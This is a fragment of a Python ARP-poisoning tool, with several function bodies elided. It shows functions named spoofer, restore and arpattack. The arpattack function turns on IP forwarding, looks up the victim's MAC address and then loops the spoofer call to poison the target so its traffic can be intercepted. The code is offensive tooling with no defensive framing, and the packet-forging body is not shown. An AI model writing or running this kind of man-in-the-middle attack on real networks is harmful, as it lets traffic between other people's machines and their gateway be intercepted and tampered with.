...
def spoofer(victimIP, gateway, victimMac, gatewayMac):
...
def restore(victimIP, gateway, victimMac, gatewayMac):
    ...
    print("[{0}+{2}][{0}INFO{2}] {1}Restoring target{2}".format(LGREEN, RD, RST))
...
def arpattack(tgtIP, gateIP):
    portforward()
    victimMac = mac(tgtIP)
    if victimMac == None:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[{0}-{2}][{3}INFO{2}] {1}Couldn't get Victim's MAC address\n{2}[{4}*{2}] {1}Host not up, try again later.{2}".format(LRED, RD, RST, LGREEN, BLUE))
        print("[{0}*{2}][{1}INFO{2}] {3}Exiting...{2}".format(BLUE, LGREEN, RST, RD))
        sys.exit(1)
    else:
    ...
    print("[{0}+{2}][{0}INFO{2}] {1}Poisoning target...{2}".format(LGREEN, RD, RST))
    while True:
        try:
            spoofer(tgtIP, gateIP, victimMac, gatewayMac)
            time.sleep(1.5)
